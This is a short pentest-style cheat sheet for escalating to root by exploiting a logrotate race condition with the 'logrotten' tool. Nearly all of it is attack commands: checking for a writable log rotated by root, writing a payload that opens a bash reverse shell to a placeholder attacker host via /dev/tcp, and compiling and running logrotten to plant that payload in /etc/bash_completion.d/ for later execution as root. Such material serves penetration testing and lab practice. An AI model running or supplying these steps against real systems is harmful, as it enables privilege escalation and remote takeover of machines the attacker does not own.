# Logrotate Race Condition (logrotten)

When root runs `logrotate` on a log file you can write to — race the rotation to write a payload to `/etc/bash_completion.d/`.

**Confirm writable log + cron:**
```bash
pspy   # watch for: UID=0 /usr/sbin/logrotate -f <config>
ls -la <logfile>   # must be writable by current user
```

**Create payload file:**
```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /tmp/payload.sh
chmod +x /tmp/payload.sh
```

**Run logrotten:**
```bash
# Download logrotten.c from github, compile:
gcc -o logrotten logrotten.c

# Trigger (write to log to force rotation, then exploit race):
echo x >> /path/to/writable.log
./logrotten -p /tmp/payload.sh /path/to/writable.log
```

logrotten places payload in `/etc/bash_completion.d/<logname>` — executes next time bash sources completions (new SSH session, sudo, etc).
